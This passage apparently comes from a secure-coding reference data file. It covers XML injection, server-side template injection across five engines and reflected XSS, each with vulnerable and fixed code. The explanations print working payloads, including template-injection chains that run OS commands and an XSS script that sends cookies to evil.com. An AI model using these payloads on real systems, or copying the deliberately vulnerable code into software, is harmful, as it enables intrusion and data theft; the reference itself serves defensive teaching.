      "later parses and trusts.\n\n" +
      "It commonly affects SOAP APIs, XML-based configuration import features, and legacy " +
      "systems that build XML requests/responses via string concatenation rather than a DOM " +
      "or XML serialization library. Consequences range from data spoofing (injecting extra " +
      "sibling elements a naive XPath or first-match parser will read instead of the " +
      "intended one) to authentication/authorization bypass when injected elements are later " +
      "trusted as if they were part of the original, server-controlled structure.",
    impact:
      "Data and structure spoofing within XML-processed documents; privilege escalation if " +
      "injected elements (role, isAdmin, price) are trusted downstream; XML-based " +
      "authentication bypass in SOAP/WS-Security contexts; can be chained with XXE or SSRF " +
      "if the injected structure introduces a DOCTYPE or external reference the parser then " +
      "resolves.",
    examples: [
      {
        title: "Java SOAP request built via string concatenation for a user profile update",
        vulnerable_code:
          "String xml = \"<user><name>\" + name + \"</name><email>\" + email +\n" +
          "             \"</email><role>user</role></user>\";\n" +
          "sendToBackend(xml);",
        fixed_code:
          "Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().newDocument();\n" +
          "Element root = doc.createElement(\"user\");\n" +
          "Element nameEl = doc.createElement(\"name\");\n" +
          "nameEl.setTextContent(name); // DOM API escapes special characters automatically\n" +
          "Element emailEl = doc.createElement(\"email\");\n" +
          "emailEl.setTextContent(email);\n" +
          "Element roleEl = doc.createElement(\"role\");\n" +
          "roleEl.setTextContent(\"user\"); // never derived from user input\n" +
          "root.appendChild(nameEl);\n" +
          "root.appendChild(emailEl);\n" +
          "root.appendChild(roleEl);\n" +
          "doc.appendChild(root);\n" +
          "sendToBackend(serialize(doc));",
        explanation:
          "Submitting name = \"Bob</name><role>admin</role><name>Bob\" produces " +
          "<user><name>Bob</name><role>admin</role><name>Bob</name><email>...</email>" +
          "<role>user</role></user> -- a document with two <role> elements. If the backend " +
          "parser (common with simple XPath selectors like //user/role[1] or naive " +
          "first-match logic) picks up the first or an unexpected role element, the attacker " +
          "achieves privilege escalation despite the trailing legitimate role element. The " +
          "fixed version builds the document using the DOM API's setTextContent(), which " +
          "automatically escapes <, >, and & in the supplied text so it can never be " +
          "interpreted as markup, and the role is hardcoded server-side rather than derived " +
          "from any request field."
      }
    ],
    detection_methods: [
      "Inject XML metacharacters (<, >, &, CDATA sequences) into fields known to be serialized into XML/SOAP payloads",
      "Attempt to inject sibling or duplicate elements around fields with security implications (role, price, quantity, isAdmin)",
      "Review code for string-concatenated XML building instead of DOM/serializer APIs"
    ],
    tools: ["Burp Suite", "SoapUI (for crafting/testing SOAP requests)", "manual XML payload crafting"],
    automated_testing:
      "Burp Suite's scanner can flag reflected XML metacharacter injection in XML content " +
      "types; for SOAP-specific testing, SoapUI lets you modify raw request XML directly " +
      "and observe backend parsing behavior, which is more reliable than generic scanners " +
      "for structural injection.",
    manual_testing: [
      "Identify all endpoints that accept or construct XML/SOAP payloads from user input",
      "Inject unescaped <, >, and & into text fields and observe whether the resulting document is malformed or restructured",
      "Attempt to inject an additional sibling element with a security-relevant name (role, isAdmin, price) and observe if it takes effect",
      "Test CDATA injection (]]><injected/><![CDATA[) to break out of CDATA sections",
      "Chain findings with XXE testing if the injected structure allows introducing a DOCTYPE declaration"
    ],
    remediation:
      "Always construct XML documents using a DOM builder, XML serialization library, or " +
      "templating engine that automatically escapes special characters in text nodes and " +
      "attribute values -- never via string concatenation. Validate input against expected " +
      "formats before serialization, and ensure any downstream XPath/parsing logic uses " +
      "precise, unambiguous selectors rather than first-match logic that could be confused " +
      "by duplicate elements.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/XML_Injection",
      "https://cwe.mitre.org/data/definitions/91.html"
    ],
    difficulty: "Medium",
    commonness: "Rare"
  },

  // ===========================================================================
  // SERVER-SIDE TEMPLATE INJECTION
  // ===========================================================================

  {
    id: "ssti-jinja2",
    name: "Server-Side Template Injection (Jinja2 / Python)",
    category: "Injection",
    cwe: "CWE-1336",
    owasp_category: "A03:2021 - Injection",
    description:
      "SSTI in Jinja2 (used by Flask by default, and standalone) happens when user input is " +
      "passed into render_template_string() or concatenated into a template string that is " +
      "then compiled and rendered, rather than being passed as template context data. Because " +
      "Jinja2 templates support full expression evaluation ({{ ... }}) including attribute " +
      "access, method calls, and Python object introspection via dunder attributes, an " +
      "attacker who controls template source can walk the Python object graph from any " +
      "in-scope object (even something as innocuous as a string literal) up through " +
      "__class__.__mro__ / __globals__ / __builtins__ to reach os.popen or subprocess and " +
      "achieve full remote code execution.\n\n" +
      "The canonical proof-of-concept payload {{7*7}} rendering as 49 confirms expression " +
      "evaluation; from there, the classic sandbox-escape chain " +
      "{{ ''.__class__.__mro__[1].__subclasses__() }} enumerates all loaded Python classes " +
      "to find one (such as subprocess.Popen or os._wrap_close) that exposes a code-execution " +
      "primitive, since Jinja2's default (non-sandboxed) environment does not restrict access " +
      "to Python internals. Flask's SandboxedEnvironment mitigates but does not fully " +
      "eliminate this class of attack, as sandbox escapes have been repeatedly published.",
    impact:
      "Full remote code execution on the application server with the privileges of the web " +
      "process; complete filesystem read/write access; credential/secret theft from " +
      "environment variables or config files; lateral movement into internal networks from " +
      "the compromised host.",
    examples: [
      {
        title: "Flask endpoint rendering user input as a template instead of template data",
        vulnerable_code:
          "from flask import Flask, request, render_template_string\n" +
          "app = Flask(__name__)\n\n" +
          "@app.route('/greet')\n" +
          "def greet():\n" +
          "    name = request.args.get('name', 'World')\n" +
          "    template = f'<h1>Hello, {name}!</h1>'\n" +
          "    return render_template_string(template)",
        fixed_code:
          "from flask import Flask, request, render_template_string\n" +
          "from markupsafe import escape\n" +
          "app = Flask(__name__)\n\n" +
          "@app.route('/greet')\n" +
          "def greet():\n" +
          "    name = request.args.get('name', 'World')\n" +
          "    # Pass user input as CONTEXT DATA, never as part of the template source string\n" +
          "    return render_template_string('<h1>Hello, {{ name }}!</h1>', name=name)",
        explanation:
          "The vulnerable version interpolates the raw name value directly into the Jinja2 " +
          "template source before compilation, so a request to " +
          "/greet?name={{7*7}} renders 'Hello, 49!', confirming SSTI, and " +
          "/greet?name={{request.application.__globals__.__builtins__.__import__('os')." +
          "popen('id').read()}} achieves remote code execution. The fixed version passes " +
          "name as a template variable (context data) rather than concatenating it into the " +
          "template source, so Jinja2's auto-escaping applies to the *value* of {{ name }} " +
          "but the string itself is never re-parsed as template syntax."
      }
    ],
    detection_methods: [
      "Inject {{7*7}}, ${7*7}, #{7*7}, and <%= 7*7 %> polyglots into every input reflected in the response and check for '49' appearing instead of the literal payload",
      "If math evaluation confirms SSTI, probe object introspection with {{ self }}, {{ config }}, or {{ ''.__class__ }} to confirm Jinja2 specifically vs another engine",
      "Review source code for render_template_string(), Template(user_input), or any f-string/concatenation feeding a template compilation call"
    ],
    tools: ["tplmap", "Burp Suite (manual polyglot payloads)", "SSTImap"],
    automated_testing:
      "tplmap automates detection and exploitation across multiple template engines: " +
      "`python2 tplmap.py -u \"https://target/greet?name=John\"` fuzzes with engine-specific " +
      "polyglots, identifies the engine, and offers an interactive OS shell once a working " +
      "RCE chain is found (`--os-shell`).",
    manual_testing: [
      "Submit the generic polyglot ${{<%[%'\"}}%\\ into every reflected parameter and note any 500 errors indicating template parsing choked on the payload",
      "Submit {{7*7}} specifically; a rendered '49' confirms Jinja2/Twig-family evaluation",
      "Fingerprint Jinja2 specifically via {{ config }} (Flask) or {{ self }} rendering internal object representations rather than an error",
      "Build the sandbox-escape chain step by step: {{ ''.__class__ }}, then {{ ''.__class__.__mro__ }}, then {{ ''.__class__.__mro__[1].__subclasses__() }} to enumerate subclasses",
      "Search the subclasses list for a class offering code execution (subprocess.Popen, os._wrap_close, catch_warnings) and invoke it via its __init__/__globals__ chain to run a command",
      "Confirm RCE with a benign command (id, whoami) before considering any destructive follow-up, and only within authorized scope"
    ],
    remediation:
      "Never pass user input into the template compilation step (render_template_string, " +
      "Template(user_controlled_string)) -- only ever pass it as context data to a fixed, " +
      "developer-authored template. If dynamic templates are a genuine business requirement, " +
      "use Jinja2's SandboxedEnvironment as defense-in-depth (understanding published sandbox " +
      "escapes still exist) and strictly allowlist which variables/filters are exposed to the " +
      "sandboxed template. Apply the same principle used for command injection: treat the " +
      "template engine as a code execution context, not a string formatter.",
    references: [
      "https://portswigger.net/web-security/server-side-template-injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_with_Jinja2.html",
      "https://cwe.mitre.org/data/definitions/1336.html"
    ],
    difficulty: "Hard",
    commonness: "Uncommon"
  },

  {
    id: "ssti-twig",
    name: "Server-Side Template Injection (Twig / PHP)",
    category: "Injection",
    cwe: "CWE-1336",
    owasp_category: "A03:2021 - Injection",
    description:
      "Twig is the default templating engine for Symfony and is widely used standalone in " +
      "PHP applications. SSTI arises the same way as in Jinja2 (which Twig's syntax closely " +
      "mirrors, using {{ }} for expressions and {% %} for statements) -- user input reaching " +
      "Twig's template compilation step (e.g. via $twig->createTemplate($userInput)) rather " +
      "than being passed purely as render context. Twig's environment does not expose Python-" +
      "style dunder introspection, but it does support object method calls and a registered " +
      "filter/function set, and if dangerous filters (like the 'filter' or unrestricted " +
      "'map' with arbitrary callables) or the app's own registered functions expose " +
      "filesystem or shell access, RCE is directly reachable.\n\n" +
      "A common escalation path abuses Twig's array_map style filters or a custom-registered " +
      "function/PHP function-call bridge if the application (unwisely) exposes an 'eval'-like " +
      "Twig extension or fails to run in Twig's sandbox mode. Even without a direct RCE " +
      "primitive, SSTI in Twig commonly yields sensitive server-side data disclosure (Twig " +
      "environment/config internals via {{ _self }} and dumping registered globals).",
    impact:
      "Remote code execution when a dangerous function/filter is reachable from the template " +
      "context (common in real-world CVEs against CMS/e-commerce platforms built on Symfony); " +
      "disclosure of application internals, environment variables, and configuration secrets " +
      "even when direct RCE is blocked by sandboxing.",
    examples: [
      {
        title: "Symfony controller rendering a user-supplied template string",
        vulnerable_code:
          "public function preview(Request $request, Environment $twig): Response\n" +
          "{\n" +
          "    $content = $request->query->get('content');\n" +
          "    $template = $twig->createTemplate($content);\n" +
          "    return new Response($template->render());\n" +
          "}",
        fixed_code:
          "public function preview(Request $request, Environment $twig): Response\n" +
          "{\n" +
          "    $content = $request->query->get('content');\n" +
          "    // Render a fixed, developer-authored template and pass user input as data only\n" +
          "    return new Response(\n" +
          "        $twig->render('preview.html.twig', ['content' => $content])\n" +
          "    );\n" +
          "}",
        explanation:
          "Passing arbitrary user input to createTemplate() compiles it as Twig source, so " +
          "/preview?content={{7*7}} confirms SSTI by rendering 49, and a payload chaining " +
          "Twig's registered filters/functions (or, in vulnerable configurations, the " +
          "constant() function to instantiate a class offering shell access) can reach RCE. " +
          "The fix renders a fixed template file (preview.html.twig) and passes the user's " +
          "content solely as a context variable, where Twig's default auto-escaping applies " +
          "to the *value* but the template *structure* is never attacker-controlled."
      }
    ],
    detection_methods: [
      "Inject {{7*7}} and {{7*'7'}} (Twig-specific: string multiplication behavior differs from Jinja2, useful for engine fingerprinting) and look for 49 vs 7777777",
      "Test {{_self}} to see if Twig internal object representation is disclosed",
      "Review Symfony/PHP source for Twig::createTemplate() or loadTemplate() calls fed by request data"
    ],
    tools: ["tplmap", "Burp Suite", "SSTImap"],
    automated_testing:
      "tplmap's engine fingerprinting distinguishes Twig from Jinja2 via differential " +
      "payloads such as {{7*'7'}} (Twig renders 49 for the multiplication if type-juggled, " +
      "Jinja2 raises a TypeError by default); once fingerprinted it attempts known Twig " +
      "RCE gadgets automatically.",
    manual_testing: [
      "Submit the generic SSTI polyglot and Twig-specific probes ({{7*7}}, {{7*'7'}}) into every reflected input",
      "Confirm the engine is Twig via {{_self}} or by testing Twig-only syntax like {% if true %}yes{% endif %}",
      "Attempt to reach the constant() function or any application-registered Twig function/filter that wraps a dangerous PHP function",
      "If a sandbox extension is in use, test for documented sandbox bypasses relevant to the Twig version in use (check CVE history for the detected version)",
      "Fall back to information disclosure (dumping globals, environment internals) if RCE is not directly reachable"
    ],
    remediation:
      "Only ever pass user data into templates as render context, never into the template " +
      "compilation step. If dynamic template content from users is unavoidable, enable " +
      "Twig's sandbox extension with a strict allowlist of tags, filters, functions, and " +
      "properties, and keep Twig updated since sandbox escape techniques are periodically " +
      "discovered and patched.",
    references: [
      "https://twig.symfony.com/doc/3.x/api.html#sandbox-extension",
      "https://portswigger.net/web-security/server-side-template-injection",
      "https://cwe.mitre.org/data/definitions/1336.html"
    ],
    difficulty: "Hard",
    commonness: "Rare"
  },

  {
    id: "ssti-freemarker",
    name: "Server-Side Template Injection (FreeMarker / Java)",
    category: "Injection",
    cwe: "CWE-1336",
    owasp_category: "A03:2021 - Injection",
    description:
      "Apache FreeMarker is a widely used Java templating engine (notably underlying many " +
      "Confluence and Struts-adjacent products). SSTI occurs when user-controlled strings are " +
      "compiled via new Template(name, userInput, config) or similar APIs. FreeMarker " +
      "directly exposes a documented and extremely powerful built-in, freemarker.template." +
      "utility.Execute, accessible via the expression " +
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ex(\"id\") -- this is not a " +
      "sandbox escape, it is an intentionally provided (if dangerous) built-in utility class " +
      "meant for administrators, making FreeMarker SSTI one of the most reliably exploitable " +
      "template injection variants once an injection point is found.\n\n" +
      "This exact primitive was the root cause of the widely exploited CVE-2021-26084 " +
      "(Atlassian Confluence OGNL injection, distinct engine but same SSTI-to-RCE pattern) " +
      "and multiple real-world FreeMarker-based CVEs where a user-controllable template " +
      "field (site title, custom page template, macro parameter) reached the FreeMarker " +
      "compiler.",
    impact:
      "Direct, reliable remote code execution via the built-in Execute utility class with no " +
      "sandbox escape research required; full server compromise; this has been the root cause " +
      "of critical CVEs in real enterprise products.",
    examples: [
      {
        title: "Java Spring controller compiling a user-supplied FreeMarker snippet",
        vulnerable_code:
          "@PostMapping(\"/preview\")\n" +
          "public String preview(@RequestParam String templateSource, Model model) throws Exception {\n" +
          "    Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);\n" +
          "    Template t = new Template(\"preview\", new StringReader(templateSource), cfg);\n" +
          "    StringWriter out = new StringWriter();\n" +
          "    t.process(model.asMap(), out);\n" +
          "    return out.toString();\n" +
          "}",
        fixed_code:
          "@PostMapping(\"/preview\")\n" +
          "public String preview(@RequestParam String userText, Model model) throws Exception {\n" +
          "    Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);\n" +
          "    // Restrict the API surface: no Execute, new(), or reflective access\n" +
          "    cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);\n" +
          "    cfg.setAPIBuiltinEnabled(false);\n" +
          "    Template t = cfg.getTemplate(\"fixed-preview.ftl\"); // developer-authored template\n" +
          "    model.addAttribute(\"userText\", userText); // passed as data only\n" +
          "    StringWriter out = new StringWriter();\n" +
          "    t.process(model.asMap(), out);\n" +
          "    return out.toString();\n" +
          "}",
        explanation:
          "Compiling templateSource directly from request input lets an attacker submit " +
          "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") } to run " +
          "arbitrary OS commands immediately -- no sandbox bypass needed, since Execute is a " +
          "documented built-in. The fixed version never compiles attacker-supplied template " +
          "source at all; it renders a fixed .ftl file with user data passed purely as model " +
          "attributes, and additionally hardens the Configuration object with a restricted " +
          "class resolver and disabled API builtin as defense-in-depth."
      }
    ],
    detection_methods: [
      "Inject ${7*7} and check for a rendered 49",
      "Probe for FreeMarker specifically using <#assign x=1+1>${x} statement syntax which is unique to FreeMarker's <# > tag style",
      "Review Java source for new Template(name, Reader/String, Configuration) calls fed by request data"
    ],
    tools: ["tplmap", "Burp Suite", "manual payload crafting"],
    automated_testing:
      "tplmap fingerprints FreeMarker via its distinctive <# > directive syntax and, once " +
      "confirmed, automatically attempts the freemarker.template.utility.Execute RCE chain " +
      "without needing a separate sandbox-escape gadget search, unlike Jinja2/Twig.",
    manual_testing: [
      "Submit ${7*7} and FreeMarker-specific directive syntax (<#assign x=1>${x}) to confirm the engine",
      "Attempt the direct RCE primitive: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
      "If Execute is blocked by a restricted class resolver, enumerate other allowed built-ins and application-registered shared variables for alternative code-execution primitives",
      "Confirm RCE with a benign command before any further action, strictly within authorized scope"
    ],
    remediation:
      "Never compile template source from user input. Where a legitimate use case involves " +
      "user-influenced templates, set setNewBuiltinClassResolver() to a restrictive resolver " +
      "(or ALLOWS_NOTHING_RESOLVER), disable the API builtin (setAPIBuiltinEnabled(false)), " +
      "and run FreeMarker with a restricted TemplateClassResolver and minimal shared data " +
      "model exposed. Keep FreeMarker updated, as this exact Execute-based technique is well " +
      "documented and actively scanned for.",
    references: [
      "https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html",
      "https://portswigger.net/web-security/server-side-template-injection",
      "https://nvd.nist.gov/vuln/detail/CVE-2021-26084"
    ],
    difficulty: "Medium",
    commonness: "Rare"
  },

  {
    id: "ssti-pebble",
    name: "Server-Side Template Injection (Pebble / Java)",
    category: "Injection",
    cwe: "CWE-1336",
    owasp_category: "A03:2021 - Injection",
    description:
      "Pebble is a Java templating engine with Jinja2-like syntax ({{ expr }}, {% tag %}) " +
      "popular in Spring Boot applications. SSTI occurs when user input reaches " +
      "PebbleEngine.getLiteralTemplate(userInput) rather than a precompiled template file. " +
      "Pebble ships with built-in security restrictions in recent versions (an allowlist of " +
      "permitted classes for the 'new' operator introduced after security research " +
      "highlighted this exact issue), but older versions and misconfigured EscapeFilter " +
      "settings allow instantiating arbitrary Java classes via " +
      "{{ ('some.string')|... }} chains or via Pebble's newer 'new' expression support to " +
      "reach classes exposing code execution, similar in spirit to Freemarker's Execute " +
      "gadget but requiring an application-configured or default-permitted class.\n\n" +
      "This class of vulnerability was demonstrated in disclosed research and CTF challenges " +
      "against real Pebble-based applications, where an attacker-controlled template snippet " +
      "used Pebble's expression evaluator to instantiate java.lang.Runtime or " +
      "ProcessBuilder-adjacent classes and invoke arbitrary shell commands.",
    impact:
      "Remote code execution in vulnerable/misconfigured Pebble versions; information " +
      "disclosure of context variables and application internals even where RCE gadgets are " +
      "blocked by the security allowlist.",
    examples: [
      {
        title: "Spring Boot notification-template feature compiling user-supplied Pebble source",
        vulnerable_code:
          "PebbleEngine engine = new PebbleEngine.Builder().build();\n" +
          "PebbleTemplate template = engine.getLiteralTemplate(request.getParameter(\"template\"));\n" +
          "Writer writer = new StringWriter();\n" +
          "template.evaluate(writer, context);\n" +
          "return writer.toString();",
        fixed_code:
          "PebbleEngine engine = new PebbleEngine.Builder()\n" +
          "    .loader(new ClasspathLoader())\n" +
          "    .extension(new SecurityExtension()) // enforce a strict allowlist for 'new'\n" +
          "    .build();\n" +
          "PebbleTemplate template = engine.getTemplate(\"notification.peb\"); // fixed template file\n" +
          "context.put(\"userMessage\", request.getParameter(\"message\")); // data only\n" +
          "Writer writer = new StringWriter();\n" +
          "template.evaluate(writer, context);\n" +
          "return writer.toString();",
        explanation:
          "getLiteralTemplate() compiles arbitrary request-supplied Pebble source, so a " +
          "payload probing {{ 7*7 }} confirms evaluation, after which an attacker attempts " +
          "class-instantiation gadgets to reach code execution. The fix loads a fixed " +
          "template from the classpath (never user-derived source), passes user input purely " +
          "as context data, and adds an explicit SecurityExtension with an allowlist to " +
          "reduce the impact of any future injection points elsewhere in the application."
      }
    ],
    detection_methods: [
      "Inject {{ 7*7 }} and Pebble-specific tag syntax ({% set x = 1 %}{{ x }}) and check for evaluation",
      "Review Java source for PebbleEngine.getLiteralTemplate() calls fed by request parameters",
      "Check the Pebble version in use against known CVEs/security advisories for class-instantiation restriction bypasses"
    ],
    tools: ["tplmap", "Burp Suite", "manual testing with Pebble syntax reference"],
    automated_testing:
      "tplmap includes Pebble-family detection heuristics; where automated tooling is " +
      "inconclusive, manually crafted probes using Pebble's own documented syntax reference " +
      "are more reliable given Pebble's smaller install base and less mature scanner " +
      "coverage compared to Jinja2/Twig.",
    manual_testing: [
      "Submit {{ 7*7 }} and confirm evaluation via the rendered output",
      "Determine the Pebble version (via error messages, response headers, or known file paths) and cross-reference published security-restriction bypasses for that version",
      "Attempt class-instantiation gadgets permitted by the application's configured (or default) allowlist to reach a code-execution primitive",
      "Fall back to context-variable and internals disclosure if RCE gadgets are blocked"
    ],
    remediation:
      "Never compile user-supplied strings as Pebble template source; only render " +
      "precompiled, developer-authored templates with user data passed as context. Always " +
      "configure Pebble's SecurityExtension/allowlist explicitly rather than relying on " +
      "defaults, and keep the Pebble dependency updated to receive security-restriction " +
      "improvements as they are published.",
    references: [
      "https://pebbletemplates.io/wiki/guide/security/",
      "https://portswigger.net/web-security/server-side-template-injection"
    ],
    difficulty: "Hard",
    commonness: "Rare"
  },

  {
    id: "ssti-velocity",
    name: "Server-Side Template Injection (Apache Velocity / Java)",
    category: "Injection",
    cwe: "CWE-1336",
    owasp_category: "A03:2021 - Injection",
    description:
      "Apache Velocity is a legacy but still widely deployed Java templating engine (VTL -- " +
      "Velocity Template Language) used historically in Struts, Confluence, and countless " +
      "internal Java web applications. SSTI arises when user input reaches " +
      "Velocity.evaluate(context, writer, logTag, userInput) or a StringResourceRepository " +
      "populated from request data. VTL directly supports calling arbitrary methods on any " +
      "object placed into the context and, critically, supports directly referencing Java " +
      "classes via $class.inspect(...) reflection tricks or, in older Velocity versions, the " +
      "#set and method-invocation syntax to reach java.lang.Runtime.getRuntime().exec(), " +
      "yielding direct RCE without needing a class-enumeration sandbox escape.\n\n" +
      "This exact vulnerability class was central to the 2015-2016 wave of Java template " +
      "injection research and remains relevant in legacy enterprise Java applications still " +
      "running Struts 1/Velocity-based admin consoles and CMS platforms that have not been " +
      "modernized.",
    impact:
      "Direct remote code execution via Java reflection reachable from VTL's method-call " +
      "syntax; complete server compromise; particularly severe in legacy enterprise " +
      "environments where these applications often run with elevated service account " +
      "privileges.",
    examples: [
      {
        title: "Legacy Java servlet evaluating a user-supplied Velocity template string",
        vulnerable_code:
          "VelocityContext context = new VelocityContext();\n" +
          "context.put(\"user\", currentUser);\n" +
          "StringWriter writer = new StringWriter();\n" +
          "Velocity.evaluate(context, writer, \"UserTemplate\", request.getParameter(\"template\"));\n" +
          "response.getWriter().write(writer.toString());",
        fixed_code:
          "VelocityContext context = new VelocityContext();\n" +
          "context.put(\"userDisplayName\", currentUser.getDisplayName()); // plain data only\n" +
          "Template template = Velocity.getTemplate(\"fixed-user-view.vm\"); // fixed template resource\n" +
          "StringWriter writer = new StringWriter();\n" +
          "template.merge(context, writer);\n" +
          "response.getWriter().write(writer.toString());",
        explanation:
          "Velocity.evaluate() compiles the raw request parameter as VTL source, so an " +
          "attacker submits " +
          "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\"," +
          "String.class).invoke($e.getClass().forName(\"java.lang.Runtime\").getMethod(" +
          "\"getRuntime\").invoke(null),\"id\") style reflection chains to reach " +
          "Runtime.exec() and achieve RCE. The fixed version renders a fixed .vm resource " +
          "and only ever places plain, already-computed data (a display name string, never " +
          "an object with a reachable reflective attack surface) into the context."
      }
    ],
    detection_methods: [
      "Inject #set($x=7*7)$x and check for 49 in the response",
      "Review Java source for Velocity.evaluate()/StringResourceLoader calls fed by request parameters",
      "Check whether legacy Struts 1 / Velocity-based admin panels are present, a strong signal of outdated, high-risk template handling"
    ],
    tools: ["tplmap", "Burp Suite", "manual VTL reflection payload crafting"],
    automated_testing:
      "tplmap includes Velocity fingerprinting and can attempt known VTL reflection-based " +
      "RCE chains automatically once the engine is confirmed via differential math-evaluation " +
      "probes.",
    manual_testing: [
      "Submit #set($x=7*7)$x and confirm evaluation",
      "Attempt the Java reflection chain via $e.getClass().forName(...) to reach Runtime.exec or ProcessBuilder",
      "If direct reflection is blocked, enumerate objects already present in the VelocityContext for any that expose a usable code-execution or file-access method",
      "Confirm RCE with a benign command only, strictly within authorized scope"
    ],
    remediation:
      "Never evaluate user-supplied strings as VTL source; only merge fixed, precompiled " +
      ".vm template resources with plain data values in the context (avoid placing complex " +
      "objects with reflective attack surface into the context at all). Where feasible, " +
      "migrate away from Velocity to a modern, actively maintained templating engine with " +
      "better sandboxing support, since Velocity itself is now in Apache Attic (unmaintained) " +
      "status.",
    references: [
      "https://velocity.apache.org/engine/2.3/user-guide.html",
      "https://portswigger.net/web-security/server-side-template-injection"
    ],
    difficulty: "Hard",
    commonness: "Rare"
  },

  // ===========================================================================
  // CROSS-SITE SCRIPTING
  // ===========================================================================

  {
    id: "xss-reflected",
    name: "Reflected Cross-Site Scripting",
    category: "XSS",
    cwe: "CWE-79",
    owasp_category: "A03:2021 - Injection",
    description:
      "Reflected XSS occurs when user-supplied input from the current request (a query " +
      "parameter, form field, or header) is echoed back into the HTML response without " +
      "proper contextual output encoding, and the browser parses that echoed content as " +
      "executable markup or script rather than inert text. Unlike stored XSS, the payload is " +
      "not persisted server-side -- it exists only within the single crafted request/response " +
      "exchange -- which means exploitation requires the attacker to deliver the malicious " +
      "URL or form submission to the victim, typically via phishing links, malicious ads, or " +
      "a link posted on a forum.\n\n" +
      "Reflected XSS is the most common XSS variant found by automated scanners because it " +
      "is directly observable within a single request/response cycle: any parameter whose " +
      "value appears verbatim (or insufficiently encoded) in the HTML, an attribute, a " +
      "<script> block, or a URL context is a candidate. The exact required payload depends " +
      "heavily on the reflection context (raw HTML body vs. an HTML attribute vs. inside an " +
      "existing <script> tag vs. inside a URL), so successful exploitation requires " +
      "identifying that context precisely.",
    impact:
      "Session hijacking via document.cookie theft (when cookies are not HttpOnly); full " +
      "account takeover by replaying stolen session tokens; credential phishing by injecting " +
      "a fake login form into the legitimate page; keylogging; drive-by malware delivery; " +
      "defacement targeted at whoever clicks the crafted link, including high-value targets " +
      "reached via spear-phishing.",
    examples: [
      {
        title: "PHP search results page reflecting the query term unescaped",
        vulnerable_code:
          "<?php\n" +
          "$query = $_GET['q'];\n" +
          "echo \"<h2>Search results for: $query</h2>\";\n" +
          "foreach (searchProducts($query) as $item) {\n" +
          "    echo \"<div>{$item['name']}</div>\";\n" +
          "}\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "$query = $_GET['q'];\n" +
          "echo '<h2>Search results for: ' . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . '</h2>';\n" +
          "foreach (searchProducts($query) as $item) {\n" +
          "    echo '<div>' . htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8') . '</div>';\n" +
          "}\n" +
          "?>",
        explanation:
          "Requesting /search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)" +
          "</script> injects a script tag directly into the page HTML, which executes in the " +
          "victim's browser session and exfiltrates their cookies to the attacker's server. " +
          "The fix applies htmlspecialchars() with ENT_QUOTES to encode <, >, &, \", and ' " +
          "before output, so the payload is rendered as inert text (&lt;script&gt;...) " +
          "rather than being parsed as an executable tag."
      },
      {
        title: "React app dangerously bypassing its default JSX escaping",
        vulnerable_code:
          "function SearchBanner({ query }) {\n" +
          "  return (\n" +
          "    <div dangerouslySetInnerHTML={{ __html: `Results for: ${query}` }} />\n" +
          "  );\n" +
          "}",
        fixed_code:
          "function SearchBanner({ query }) {\n" +
          "  return <div>Results for: {query}</div>; // JSX auto-escapes interpolated values\n" +
          "}",
        explanation:
          "React automatically HTML-escapes any value interpolated via {expression} in JSX, " +
          "but dangerouslySetInnerHTML explicitly opts out of that protection and injects raw " +
          "HTML/script, so a query value of <img src=x onerror=alert(document.domain)> " +
          "executes immediately. The fix removes dangerouslySetInnerHTML entirely and relies " +
          "on React's default JSX text-node escaping, which is safe for plain text " +
          "interpolation."
      }
    ],
    detection_methods: [
      "Inject a unique canary string with HTML metacharacters (e.g. zzXSSzz<>\"') into every parameter and search the raw response for unescaped reflection",
      "Determine the exact reflection context (HTML body, attribute value, script block, URL, CSS) and craft a context-appropriate payload",
      "Test with a full polyglot payload that fires across multiple contexts simultaneously to save enumeration time"
    ],
    tools: ["Burp Suite Scanner", "OWASP ZAP", "XSStrike", "Dalfox", "Google Chrome DevTools (manual DOM inspection)"],
    automated_testing:
      "Dalfox provides fast, context-aware reflected XSS scanning: " +
      "`dalfox url \"https://target/search?q=FUZZ\" --deep-domxss` identifies reflection " +
      "points and attempts context-appropriate payloads automatically; Burp Suite's active " +
      "scanner similarly identifies reflection and tests common bypass payloads, but manual " +
      "confirmation in a real browser is required since scanners can both over- and " +
      "under-report based on response-body pattern matching alone.",
    manual_testing: [
      "Inject a unique alphanumeric canary into every parameter and grep the raw response for its unescaped reflection",
      "Identify the precise reflection context: raw HTML body, HTML attribute (quoted/unquoted), inside a <script> block, inside a URL (href/src), or inside a CSS value",
      "Craft a context-specific payload: <script>alert(document.domain)</script> for HTML body, \"><svg onload=alert(1)> for a broken-out attribute, or ';alert(1);// for inside an existing script string",
      "Test with alternative tags/events if <script> is filtered: <img src=x onerror=...>, <svg onload=...>, <body onpageshow=...>, <details open ontoggle=...>",
      "Verify the payload actually executes in a real browser (not just appears unescaped in raw response text), since browser HTML parsing quirks affect exploitability",
      "Confirm impact with a benign PoC (alert(document.domain)) before considering a cookie-theft or session-riding demonstration, per engagement rules of engagement"
    ],
    remediation:
      "Apply context-aware output encoding at the point of output for every piece of " +
      "user-controlled data: HTML-entity encode for HTML body contexts, attribute encode for " +
      "attribute values, JavaScript-string encode for script contexts, and URL-encode for URL " +
      "contexts -- a single encoding scheme applied blindly is not sufficient. Use templating " +
      "engines with auto-escaping enabled by default (Jinja2 autoescape, React JSX, Vue " +
      "templates) and avoid raw HTML injection APIs (innerHTML, dangerouslySetInnerHTML, " +
      "v-html) unless the content is passed through a vetted sanitizer like DOMPurify. Deploy " +
      "a strict Content-Security-Policy as defense-in-depth to limit the impact of any XSS " +
      "that slips through output encoding.",
    references: [
      "https://owasp.org/www-community/attacks/xss/Reflected_XSS",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
